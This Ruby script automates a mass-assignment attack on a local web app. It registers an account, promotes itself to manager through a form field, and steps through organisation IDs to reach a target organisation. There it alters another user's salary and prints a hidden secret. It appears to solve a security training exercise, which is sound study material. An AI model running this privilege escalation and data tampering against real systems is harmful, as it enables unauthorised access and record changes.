#!/usr/bin/env ruby

require 'mechanize'

target_organisation = 'The Daily Planet'
target_name = 'Clark Kent'

Mechanize.new.instance_eval do
  get 'http://localhost:3000'

  # Register a new account
  page.link_with(text: 'Sign up').click

  email, password = "ali+#{rand(10000)}@happybearsoftware.com", '12345678'

  page.forms.first.tap do |f|
    f['user[name]']                  = 'Fred Fredson'
    f['user[email]']                 = email
    f['user[organisation_name]']     = 'New Organisation'
    f['user[password]']              = password
    f['user[password_confirmation]'] = password
    f.submit
  end

  # Visit 'edit account' page
  page.link_with(text: 'Edit account').click

  # Upgrade myself to a manager user
  page.forms.first.tap do |f|
    f['user[manager]']          = '1'
    f['user[current_password]'] = password
    f.submit
  end

  # Iterate the organisation ids from 0 => ours
  our_org_id = page.uri.path.split('/').last.to_i

  (1..our_org_id).each do |org_id|
    page.link_with(text: 'Edit account').click
    page.forms.first.tap do |f|
      f['user[organisation_id]']  = org_id.to_s
      f['user[current_password]'] = password
      f.submit
    end
    organisation = page.search('h3').text.strip

    if target_organisation == organisation
      # We've found the target organisation
      # Now update the target users salary
      page.link_with(text: target_name).click
      page.forms.first.tap do |f|
        f['salary[amount]'] = '25000'
        f.submit
      end

      # The secret appears, so output and exit
      puts page.search('.secret').text.strip
      exit
    end

  end
end
